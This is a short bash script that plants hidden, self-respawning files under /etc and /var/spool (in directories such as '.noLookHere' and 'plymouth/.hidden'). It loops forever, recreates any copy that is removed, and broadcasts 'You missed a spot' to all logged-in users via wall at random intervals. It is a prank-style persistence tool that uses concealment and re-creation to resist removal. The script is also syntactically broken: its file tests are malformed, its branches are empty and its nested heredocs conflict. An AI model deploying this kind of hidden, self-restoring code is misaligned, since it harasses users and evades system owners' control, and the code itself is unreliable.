#!/bin/bash
mkdir /etc/.music
mkdir /etc/.music/.noLookHere
cat <<EOF > /etc/.music/.noLookHere/.annoyance.sh
#!/bin/bash
while true
do
if [/var/spool/plymouth/.hidden/.annoyance.sh]
then
else
if [/var/spool/plymouth/.hidden]
then
cat <<EOF > /var/spool/plymouth/.hidden/.annoyance.sh
#!/bin/bash
while true
do
if [/var/spool/.annoyance.sh]
then
else
cat <<EOF > /var/spool/.annoyance.sh
#!/bin/bash
while true
do
wall -n "You missed a spot"
sleep $((10 + $RANDOM % 51))
done
EOF
chmod +x /var/spool/.annoyance.sh
bash /var/spool/.annoyance.sh
fi
sleep 60
done
EOF
else
if [/var/spool/plymouth]
then
mkdir .hidden
cat <<EOF > /var/spool/plymouth/.hidden/.annoyance.sh
#!/bin/bash
while true
do
if [/var/spool/.annoyance.sh]
then
else
cat <<EOF > /var/spool/.annoyance.sh
#!/bin/bash
while true
do
wall -n "You missed a spot"
sleep $((10 + $RANDOM % 51))
done
EOF
chmod +x /var/spool/.annoyance.sh
bash /var/spool/.annoyance.sh
fi
sleep 60
done
EOF
else
if [/var/spool]
then
mkdir plymouth
mkdir plymouth/.hidden
cat <<EOF > /var/spool/plymouth/.hidden/.annoyance.sh
#!/bin/bash
while true
do
if [/var/spool/.annoyance.sh]
then
else
cat <<EOF > /var/spool/.annoyance.sh
#!/bin/bash
while true
do
wall -n "You missed a spot"
sleep $((10 + $RANDOM % 51))
done
EOF
chmod +x /var/spool/.annoyance.sh
bash /var/spool/.annoyance.sh
fi
sleep 60
done
EOF
fi
fi
done
sleep 120
EOF
chmod +x /etc/.music/.noLookHere/.annoyance.sh
bash /etc/.music/.noLookHere/.annoyance.sh